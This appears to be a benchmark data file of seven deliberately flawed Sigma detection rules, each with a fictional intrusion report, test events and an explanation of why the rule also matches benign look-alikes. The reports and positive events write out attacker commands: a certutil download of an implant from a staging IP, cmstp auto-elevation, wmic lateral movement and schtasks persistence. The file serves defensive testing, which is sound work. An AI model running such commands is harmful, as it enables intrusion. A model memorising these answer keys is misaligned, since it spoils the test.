@@ -1,0 +1,468 @@
+{
+ "cases": [
+  {
+   "assumptions": [],
+   "defect_class": "D9",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "cmstp.exe /s /ni C:\\ProgramData\\CraneVPN\\cranevpn.inf",
+      "image": "C:\\Windows\\System32\\cmstp.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\CraneVPN\\deploy\\cranevpn_setup.exe",
+      "parent_cmd": "cranevpn_setup.exe /deploy",
+      "user": "NT AUTHORITY\\SYSTEM"
+     },
+     {
+      "cmd": "cmstp.exe /u C:\\ProgramData\\CraneVPN\\cranevpn.inf",
+      "image": "C:\\Windows\\System32\\cmstp.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\CraneVPN\\deploy\\cranevpn_setup.exe",
+      "parent_cmd": "cranevpn_setup.exe /remove",
+      "user": "NT AUTHORITY\\SYSTEM"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "cmd.exe /c ipconfig /all",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "C:\\Windows\\explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "msiexec.exe /i C:\\Temp\\viewer_setup.msi /qn",
+      "image": "C:\\Windows\\System32\\msiexec.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\services.exe",
+      "parent_cmd": "C:\\Windows\\System32\\services.exe",
+      "user": "NT AUTHORITY\\SYSTEM"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "cmstp.exe /s /ni /au C:\\Users\\Public\\Documents\\cfg_update.inf",
+      "image": "C:\\Windows\\System32\\cmstp.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wscript.exe",
+      "parent_cmd": "wscript.exe C:\\Users\\Public\\Documents\\invoice_view.js",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "cmstp.exe /s /ni /au C:\\Users\\Public\\Documents\\profile_b7.inf",
+      "image": "C:\\Windows\\System32\\cmstp.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wscript.exe",
+      "parent_cmd": "wscript.exe C:\\Users\\Public\\Documents\\remit_notice.js",
+      "user": "LAB\\bob"
+     }
+    ]
+   },
+   "evidence": [
+    "cmstp.exe /s /ni /au C:\\Users\\Public\\Documents\\cfg_update.inf",
+    "The silent and no-interface switches suppress every dialog"
+   ],
+   "expected_gate": "G10",
+   "id": "D9-01",
+   "logsource": "windows_process_creation",
+   "report_text": "During the intrusion at a regional logistics firm, the operator escalated privileges without dropping any new executable. A phishing-delivered script wrote an installation file into the public documents folder and then invoked the Microsoft Connection Manager Profile Installer to process it. The command observed on the endpoint was: cmstp.exe /s /ni /au C:\\Users\\Public\\Documents\\cfg_update.inf. The silent and no-interface switches suppress every dialog, and the all-users switch causes the profile installer to run an auto-elevated COM object, which in this case executed a second-stage payload with high integrity. The parent of the cmstp.exe process was wscript.exe. Responders recovered the same technique on two further hosts the following night, always with a different installation file name but the same switches.",
+   "role": "defective",
+   "sigma_yaml": "title: CMSTP Silent Install Of Profile File With No Interface Switch\nid: 7c1e5a42-93b8-4d6f-a0c3-5e8f21b4d907\nstatus: experimental\ndescription: Detects cmstp.exe invoked with the silent and no-interface switches against an inf file, as used to launch an auto-elevated second-stage payload\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.003\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\cmstp.exe'\n    CommandLine|contains|all:\n      - '/s'\n      - '/ni'\n      - '.inf'\n  condition: selection\nfalsepositives:\n  - Unknown\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.003"
+   ],
+   "why": "The rule keys on cmstp.exe with /s, /ni and an .inf path but omits the /au auto-elevation switch that the report ties to the malicious use. A deployment tool silently installing a VPN connection profile with cmstp.exe /s /ni <profile>.inf satisfies every condition, so it matches the benign look-alike."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D9",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "198.51.100.20",
+      "dest_port": "7070",
+      "image": "C:\\Program Files\\HelpLink\\hl_agent.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "198.51.100.12",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.10",
+      "dest_port": "445",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "203.0.113.77",
+      "dest_port": "7070",
+      "image": "C:\\Users\\Public\\Libraries\\hl_agent.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.78",
+      "dest_port": "7070",
+      "image": "C:\\Users\\Public\\Libraries\\hl_agent.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "Network telemetry shows hl_agent.exe initiating outbound sessions to a relay at 203.0.113.77 on TCP port 7070",
+    "The portable agent, hl_agent.exe, was copied to C:\\Users\\Public\\Libraries and launched by a scheduled task."
+   ],
+   "expected_gate": "G10",
+   "id": "D9-02",
+   "logsource": "windows_network_connection",
+   "report_text": "In the second week of the intrusion the operator installed a commercial remote-support utility, HelpLink, as a persistence fallback. The portable agent, hl_agent.exe, was copied to C:\\Users\\Public\\Libraries and launched by a scheduled task. Network telemetry shows hl_agent.exe initiating outbound sessions to a relay at 203.0.113.77 on TCP port 7070, which is the vendor's default relay port, every few minutes. A standby relay at 203.0.113.78 answered on the same port when the primary was unreachable. Because the binary is legitimately signed and the traffic is encrypted, the operator was able to mimic ordinary help-desk activity. In total the victim network produced thousands of sessions over nine days. Defenders should note that the agent file name was not changed by the operator.",
+   "role": "defective",
+   "sigma_yaml": "title: HelpLink Agent Session To Default Relay Port\nid: b3a94f10-6d2e-47c8-9b15-c0e7a8d3f562\nstatus: experimental\ndescription: Detects the HelpLink remote-support agent making an outbound connection to TCP port 7070 as seen when the operator used it as a persistence fallback\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1219\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\hl_agent.exe'\n    DestinationPort: 7070\n  condition: selection\nfalsepositives:\n  - Unknown\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1219"
+   ],
+   "why": "The rule matches on the agent file name and the vendor default relay port only, with no constraint on the install path or the destination address. The sanctioned HelpLink agent installed under Program Files connecting to the vendor cloud relay on port 7070 differs from the malicious positives only in its directory and destination IP, and is matched."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D9",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "lab-intranet.cranecloud.test"
+     }
+    ],
+    "negative": [
+     {
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "dns_query",
+      "name": "www.example.test"
+     },
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "gallery.lab.example"
+     }
+    ],
+    "positive": [
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "fnx-sync.cranecloud.test"
+     },
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "k7q-sync.cranecloud.test"
+     }
+    ]
+   },
+   "evidence": [
+    "Every 90 seconds powershell.exe resolves fnx-sync.cranecloud.test or one of its rotating siblings",
+    "all of them free tenant names on the public application-hosting platform cranecloud.test"
+   ],
+   "expected_gate": "G10",
+   "id": "D9-03",
+   "logsource": "windows_dns_query",
+   "report_text": "The second-stage implant beacons over HTTPS from PowerShell, and the resolver logs show how it finds its relay. Every 90 seconds powershell.exe resolves fnx-sync.cranecloud.test or one of its rotating siblings, all of them free tenant names on the public application-hosting platform cranecloud.test. The operator registered these tenants with a throwaway account and rotated the leftmost label each day, which defeats blocklists of single hostnames. Across one working day the implant queried 17 distinct tenant names. The lookups were attributed to powershell.exe in every case, and no browser or system service resolved any of them. Investigators were unable to attribute the throwaway account to a named person.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell Lookup Of Cranecloud Platform Tenant Names\nid: 1f8d2c76-a4e9-4b30-8e57-d9c1630b2a4e\nstatus: experimental\ndescription: Detects powershell.exe resolving tenant names on the cranecloud.test hosting platform used by the implant for relay discovery\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1071.001\nlogsource:\n  category: dns_query\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    QueryName|endswith: '.cranecloud.test'\n  condition: selection\nfalsepositives:\n  - Unknown\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1071.001"
+   ],
+   "why": "The rule matches any PowerShell lookup under the shared hosting platform domain cranecloud.test, not the operator's specific tenant names. A PowerShell monitoring script resolving the organisation's own tenant on that platform differs from the malicious lookups only in the leftmost label and is matched."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D9",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "schtasks.exe /create /tn CraneBackupTray /tr C:\\Progra~1\\CraneBackup\\tray.exe /sc onlogon /rl highest",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\msiexec.exe",
+      "parent_cmd": "msiexec.exe /i C:\\Windows\\Installer\\crane_backup.msi /qn",
+      "user": "NT AUTHORITY\\SYSTEM"
+     },
+     {
+      "cmd": "schtasks.exe /create /tn CraneBackupNightly /tr C:\\Progra~1\\CraneBackup\\run.exe /sc daily /st 01:30",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\msiexec.exe",
+      "parent_cmd": "msiexec.exe /i C:\\Windows\\Installer\\crane_backup.msi /qn",
+      "user": "NT AUTHORITY\\SYSTEM"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "schtasks.exe /query /fo LIST",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "ipconfig /all",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "schtasks.exe /create /tn CloudSyncHelper /tr C:\\ProgramData\\Crane\\sync.exe /sc onlogon /rl highest",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wscript.exe",
+      "parent_cmd": "wscript.exe C:\\Users\\Public\\Documents\\fin_macro.js",
+      "user": "LAB\\carol"
+     },
+     {
+      "cmd": "schtasks.exe /create /tn CloudSyncHelper /tr C:\\ProgramData\\Crane\\sync.exe /sc onlogon /rl highest /f",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\ProgramData\\Crane\\stage.exe",
+      "parent_cmd": "C:\\ProgramData\\Crane\\stage.exe",
+      "user": "LAB\\dave"
+     }
+    ]
+   },
+   "evidence": [
+    "schtasks.exe /create /tn CloudSyncHelper /tr C:\\ProgramData\\Crane\\sync.exe /sc onlogon /rl highest",
+    "The task is registered to run at every user logon with the highest available privileges"
+   ],
+   "expected_gate": "G10",
+   "id": "D9-04",
+   "logsource": "windows_process_creation",
+   "report_text": "Persistence on the finance workstations relied on a scheduled task disguised as a cloud-sync helper. The macro-enabled attachment spawned schtasks.exe with the following arguments: schtasks.exe /create /tn CloudSyncHelper /tr C:\\ProgramData\\Crane\\sync.exe /sc onlogon /rl highest. The task is registered to run at every user logon with the highest available privileges, so the implant restarts after each reboot without further operator action. The same task name was reused on all seven affected hosts, but the binary hash differed between them. Analysts noted that the task was created by a script interpreter or by the stager itself, never by an installer or an administrative console.",
+   "role": "defective",
+   "sigma_yaml": "title: Scheduled Task Created At Logon With Highest Privileges\nid: e5069b3d-71fa-4c82-b6d4-38a2f0c91e75\nstatus: experimental\ndescription: Detects schtasks.exe creating a task that runs at logon with the highest run level, as used to persist a cloud-sync lookalike implant\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.privilege_escalation\n  - attack.t1053.005\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\schtasks.exe'\n    CommandLine|contains|all:\n      - '/create'\n      - '/sc onlogon'\n      - '/rl highest'\n  condition: selection\nfalsepositives:\n  - Unknown\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1053.005"
+   ],
+   "why": "The rule matches schtasks.exe /create with /sc onlogon and /rl highest but does not constrain the task target or the parent process that the report says distinguishes the malicious task. A software installer registering its own tray application at logon with the same switches matches the benign look-alike."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D9",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "wmic.exe /node:APP01 process call create \"C:\\Program Files\\CranePatch\\patchrun.exe /quiet\"",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\CranePatch\\console\\cpconsole.exe",
+      "parent_cmd": "cpconsole.exe",
+      "user": "LAB\\patch-admin"
+     },
+     {
+      "cmd": "wmic.exe /node:APP01 product get name,version",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\CranePatch\\console\\cpconsole.exe",
+      "parent_cmd": "cpconsole.exe",
+      "user": "LAB\\patch-admin"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "wmic.exe os get caption,version",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "ping 192.0.2.10",
+      "image": "C:\\Windows\\System32\\PING.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "wmic.exe /node:FS02 process call create C:\\Users\\Public\\r.exe",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-files"
+     },
+     {
+      "cmd": "wmic.exe /node:APP07 process call create C:\\Users\\Public\\r.exe",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\ProgramData\\Crane\\beacon.exe",
+      "parent_cmd": "C:\\ProgramData\\Crane\\beacon.exe",
+      "user": "LAB\\svc-files"
+     }
+    ]
+   },
+   "evidence": [
+    "wmic.exe /node:FS02 process call create C:\\Users\\Public\\r.exe"
+   ],
+   "expected_gate": "G10",
+   "id": "D9-05",
+   "logsource": "windows_process_creation",
+   "report_text": "Lateral movement from the compromised file server used built-in WMI tooling instead of a remote shell. The operator ran wmic.exe /node:FS02 process call create C:\\Users\\Public\\r.exe to start the beacon on the second server, and repeated the pattern against four further hosts using the same account. Because no service is installed on the target and no file share is touched beyond the staged binary, there is little footprint besides the process creation itself. Defenders can recover the remote hostname from the node argument, and the child process on the target is parented by WmiPrvSE.exe. The staged binary was always named r.exe and was copied beforehand to the public profile directory of each target.",
+   "role": "defective",
+   "sigma_yaml": "title: WMIC Remote Process Creation Via Node Argument\nid: 90d7a1e8-2b64-4f39-a8c5-6e13b7d4f209\nstatus: experimental\ndescription: Detects wmic.exe starting a process on a remote node, as used for lateral movement from the compromised file server\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1047\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\wmic.exe'\n    CommandLine|re: '/node:[^ ]+ process call create'\n  condition: selection\nfalsepositives:\n  - Unknown\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1047"
+   ],
+   "why": "The regex matches any wmic.exe remote process creation (/node:<host> process call create) without constraining the launched payload. A patch-management console running wmic.exe /node:APP01 process call create on its own patch runner uses the same flags and is matched by the rule."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D9",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "certutil.exe -verifyctl -f -split http://pki.cranehealth.test/ctl/authrootstl.cab",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\svchost.exe",
+      "parent_cmd": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
+      "user": "NT AUTHORITY\\SYSTEM"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "certutil.exe -hashfile C:\\Temp\\setup.msi SHA256",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "certutil.exe -store My",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "certutil.exe -urlcache -split -f http://203.0.113.45/stage/a.exe C:\\Users\\Public\\a.exe",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\erin"
+     },
+     {
+      "cmd": "certutil.exe -urlcache -split -f http://203.0.113.45/stage/b.dll C:\\Users\\Public\\b.dll",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\erin"
+     }
+    ]
+   },
+   "evidence": [
+    "certutil.exe -urlcache -split -f http://203.0.113.45/stage/a.exe C:\\Users\\Public\\a.exe",
+    "always carried an HTTP URL beginning with http://"
+   ],
+   "expected_gate": "G10",
+   "id": "D9-06",
+   "logsource": "windows_process_creation",
+   "report_text": "Tooling was staged through living-off-the-land downloads. The intruder used certutil.exe to pull the implant from the staging server with the command certutil.exe -urlcache -split -f http://203.0.113.45/stage/a.exe C:\\Users\\Public\\a.exe. This switch combination fetches the remote file through the CryptoAPI URL cache and writes it to disk, sidestepping the browser's proxy settings. The implant was executed within seconds of the download completing, by the same parent shell. In the telemetry the download command always carried an HTTP URL beginning with http:// and always wrote to a path under the public profile folder. Certutil was never otherwise used on these hosts during the intrusion window.",
+   "role": "defective",
+   "sigma_yaml": "title: Certutil Split Download Of Remote File Over HTTP\nid: 4a2c88f1-d530-49b7-91ee-7b06c5a3d18f\nstatus: experimental\ndescription: Detects certutil.exe fetching a remote file over HTTP with the split and force switches, as used to stage the implant\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1105\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\certutil.exe'\n    CommandLine|contains|all:\n      - '-split'\n      - '-f'\n      - 'http://'\n  condition: selection\nfalsepositives:\n  - Unknown\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1105"
+   ],
+   "why": "The rule requires certutil.exe with -split, -f and an http:// URL but drops the -urlcache switch that characterises the download technique in the report. A scheduled trust-list refresh using certutil.exe -verifyctl -f -split against an internal PKI host differs from the malicious command by one switch and is matched."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D9",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "192.0.2.40",
+      "dest_port": "8080",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "198.51.100.7",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "198.51.100.9",
+      "dest_port": "80",
+      "image": "C:\\Windows\\explorer.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "203.0.113.90",
+      "dest_port": "8080",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.90",
+      "dest_port": "8080",
+      "image": "C:\\Windows\\SysWOW64\\mshta.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "mshta.exe was spawned with a URL argument and established an outbound HTTP connection to 203.0.113.90 on TCP port 8080",
+    "The use of port 8080 rather than the default web ports was consistent across all six victims"
+   ],
+   "expected_gate": "G10",
+   "id": "D9-07",
+   "logsource": "windows_network_connection",
+   "report_text": "The initial-access chain used a remotely hosted HTA application. After the victim opened a shortcut file, mshta.exe was spawned with a URL argument and established an outbound HTTP connection to 203.0.113.90 on TCP port 8080 to retrieve the application. The use of port 8080 rather than the default web ports was consistent across all six victims, and the server returned content of type application/hta. Once downloaded, the HTA launched a PowerShell stager that connected to a second address. The analysts note that mshta.exe made no other network connections on the victim systems during the intrusion window, and that the infrastructure at 203.0.113.90 was taken down two days after discovery.",
+   "role": "defective",
+   "sigma_yaml": "title: Mshta Outbound Connection On Port 8080\nid: c68e3b05-f17a-4d92-83b0-2a9d4e5c7f61\nstatus: experimental\ndescription: Detects mshta.exe opening an outbound connection to TCP port 8080 to retrieve a remotely hosted HTA application\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.005\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\mshta.exe'\n    DestinationPort: 8080\n  condition: selection\nfalsepositives:\n  - Unknown\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.005"
+   ],
+   "why": "The rule matches any mshta.exe connection to TCP port 8080 without constraining the destination address. A legacy HTA-based helpdesk kiosk application contacting the internal intranet server on port 8080 differs from the malicious positives only in the destination IP and is matched."
+  }
+ ]
+}
